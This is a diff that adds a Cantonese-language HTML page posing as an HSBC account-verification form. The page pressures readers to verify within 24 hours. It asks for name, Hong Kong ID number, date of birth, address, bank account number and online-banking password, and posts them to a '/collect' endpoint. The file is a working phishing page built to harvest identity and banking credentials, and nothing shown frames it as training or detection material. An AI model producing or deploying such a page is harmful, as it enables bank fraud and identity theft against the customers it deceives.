@@ -1,0 +1,35 @@
+<!doctype html>
+<html lang="zh-HK">
+<head>
+<meta charset="utf-8">
+<title>滙豐銀行 - 帳戶驗證</title>
+<style>
+  body { font-family: system-ui, sans-serif; margin: 0; background: #f6f7f9; color: #202124; }
+  .wrap { max-width: 520px; margin: 48px auto; background: #fff; padding: 32px; border-radius: 12px;
+           box-shadow: 0 1px 4px rgba(0,0,0,.12); }
+  h1 { font-size: 20px; margin: 0 0 4px; }
+  p.lede { margin: 0 0 24px; color: #5f6368; font-size: 14px; }
+  label { display: block; margin: 14px 0 4px; font-size: 13px; font-weight: 600; }
+  input, select { width: 100%; box-sizing: border-box; padding: 9px 10px; font-size: 14px;
+                   border: 1px solid #dadce0; border-radius: 6px; }
+  button { margin-top: 22px; width: 100%; padding: 11px; font-size: 15px; border: 0;
+            border-radius: 6px; background: #1a73e8; color: #fff; cursor: pointer; }
+</style>
+</head>
+<body>
+<div class="wrap">
+
+<h1>帳戶安全驗證</h1>
+<p class="lede">為保障你嘅帳戶安全，請於 24 小時內完成身份驗證。</p>
+<form action="/collect" method="post">
+  <label for="nm">姓名</label><input id="nm" name="name" autocomplete="name" required>
+  <label for="hkid">身份證號碼</label><input id="hkid" name="hkid" placeholder="A123456(7)" required>
+  <label for="dob">出生日期</label><input id="dob" name="dob" type="date" autocomplete="bday" required>
+  <label for="addr">住址</label><input id="addr" name="addr" autocomplete="street-address" required>
+  <label for="acct">銀行戶口號碼</label><input id="acct" name="account_no" required>
+  <label for="pin">網上理財密碼</label><input id="pin" name="pin" type="password" required>
+  <button type="submit">立即驗證</button>
+</form>
+</div>
+</body>
+</html>
